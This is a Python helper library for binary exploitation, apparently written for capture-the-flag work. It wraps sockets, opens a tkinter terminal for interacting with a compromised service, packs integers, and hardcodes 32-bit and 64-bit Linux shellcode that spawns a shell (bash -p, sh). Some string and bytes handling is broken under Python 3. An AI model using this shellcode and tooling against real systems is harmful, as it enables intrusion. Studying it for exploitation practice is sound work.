import sys, telnetlib, time, socket, struct
from subprocess import Popen, PIPE
import tkinter, select
import string

def processStr(str):
	res = ""
	for ch in str:
		if chr(ch) in string.printable:
			res += chr(ch)
		else:
			res += "\\" + hex(ch)[1:]
	return res

tmp = None

class HarDToSock:
	def __init__(self, *args, **kwargs):
		self.magicValue = 1928
		self.timeout = 1
		if "DEBUG" in kwargs:
			self.host = "localhost"
			self.port = self.magicValue
		elif ( "host" in kwargs ) and ( "port" in kwargs ):
			self.host = kwargs["host"]
			self.port = kwargs["port"]
		else:
			print ("[-] Failed in connecting")
			sys.exit()
		self.sock = socket.create_connection((self.host, self.port))
		if "timeout" in kwargs:
			self.timeout = kwargs["timeout"]

	def recv(self, **kwargs):
		self.sock.setblocking(0)
		ready = select.select([self.sock], [], [], self.timeout)
		if ready[0]:
			if len(kwargs) == 0:
				return processStr(self.sock.recv(4096))
			elif "end" in kwargs:
				s = kwargs["end"]
				buf = ''
				while not buf.endswith(s):
					tmp = self.sock.recv(1)
					if tmp:
						buf += tmp
					else:
						print ("[-] Cannot find that ending")
						sys.exit()
				return processStr(buf)
			else:
				print ("[-] Need a purpose to wait!")
				sys.exit()
		else:
			print ("[+] No return message")
			return ""
	def send(self, payload):
		self.sock.send(payload.encode())

	def sendline(self, payload):
		self.sock.send((payload + "\n").encode())

	class Terminal(tkinter.Frame):
		def Enter_pressed(self):
			input_get = self.input.get("1.0", tkinter.END)
			if input_get.split('\n')[-2] == 'exit':
				sys.exit()
			if ( tmp != None ) and ( input_get.split('\n')[-2] ):
				tmp.sendline(input_get.split('\n')[-2])
				string = ""
				tmp.sock.setblocking(0)
				ready = select.select([tmp.sock], [], [], tmp.timeout)
				if ready[0]:
					string = tmp.recv()
				else:
					print ("[+] No return message")
				if string[:-1] != '\n' and len(self.output.get("1.0", tkinter.END)) > 1:
					self.output.insert(tkinter.INSERT, "\n")
				self.output.insert(tkinter.INSERT, string)
				self.output.see(tkinter.END)

		def onResize(self, event):
			self.width = event.width
			self.height = event.height
			#print self.width, ",", self.height
			self.config(width=self.width, height=self.height)

		def __init__(self, parent, *args, **kwargs):
			tkinter.Frame.__init__(self, parent, *args, **kwargs)
			self.parent = parent
			self.bind("<Configure>", self.onResize)

			self.label = tkinter.Label(self, text="Nothing is impossible\nImpossible says its self \"I\'m possible\"")
			self.interact = tkinter.Frame(self)

			self.input = tkinter.Text(self.interact, width=40, height=24, fg="light green", bg="black", font = "Helvetica 13 bold")
			self.input.bind("<Return>", lambda x: self.Enter_pressed())
			self.input.focus_set()
			
			self.output = tkinter.Text(self.interact, width=60, height=24, fg="light green", bg="black", font = "Helvetica 13 bold")

			self.label.pack()
			self.interact.pack()
			self.input.grid(row=0, column=0, padx=4, pady=2)
			self.output.grid(row=0, column=1, padx=2, pady=2)
			
	def hardtopwn(self):
		global tmp
		print ("[+] Recveiving the remain bytes...")
		while True:
			self.sock.setblocking(0)
			ready = select.select([self.sock], [], [], self.timeout)
			if ready[0]:
				self.sock.recv(4096)
				continue
			else:
				break
		print ("[+] Keep calm and try harder")
		root = tkinter.Tk()
		root.geometry("923x504")
		root.resizable(width=False, height=False)
		root.title("Terminal")
		tmp = self
		HarDToSock.Terminal(root).pack(fill="both", expand=True)
		root.mainloop()


def p32(number):
	return struct.pack('<I', number).decode()

def u32(s):
	tmp = s[:]
	while len(tmp) < 4:
		tmp += b'\x00'
	return struct.unpack('<I', tmp)[0]

def p64(number):
	return struct.pack('<Q', number).decode()

def u64(s):
	tmp = s[:]
	while len(tmp) < 8:
		tmp += b'\x00'
	return struct.unpack('<Q', tmp)[0]
def log(s):
	print ("[+] " + s)

def shcode32():
	return "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"

def shcode64():
	return "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

